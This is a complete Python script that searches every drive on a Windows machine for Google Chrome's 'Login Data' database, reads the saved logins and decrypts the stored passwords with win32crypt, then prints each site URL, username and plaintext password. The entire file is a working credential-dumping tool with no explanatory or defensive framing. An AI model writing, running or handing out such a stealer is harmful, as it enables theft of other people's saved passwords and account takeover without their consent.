import win32crypt
import win32api
import re
import os
import sqlite3

def find_all_files(root_folder, rex):
    paths = []
    for root,dirs,files in os.walk(root_folder):
        for f in files:
            result = rex.search(f)
            if result:
                paths.append(os.path.join(root,f))
    print('Finished searching on', root_folder)
    return paths

def find_all_files_in_all_drives(file_name):
    paths = []
    #create a regular expression for the file
    rex = re.compile(file_name)
    print('Searching for Google Chrome login credentials on your computer')
    for drive in win32api.GetLogicalDriveStrings().split('\000')[:-1]:
        paths.extend(find_all_files( drive, rex ))
    return paths

def dump_all_credentials():
    for db_file in find_all_files_in_all_drives("^Login Data$"):
        try:
            dump_credentials(db_file)
        except:
            print('Error dumping credentials from', db_file)
            pass

def dump_credentials(db_file):
    conn = sqlite3.connect(db_file)
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    for raw in cursor.fetchall():
        print('------------------------------------------------')
        print('URL:', raw[0])
        print('User:', raw[1])
        print('Pass:', win32crypt.CryptUnprotectData(raw[2])[1])
        print('------------------------------------------------')

dump_all_credentials()
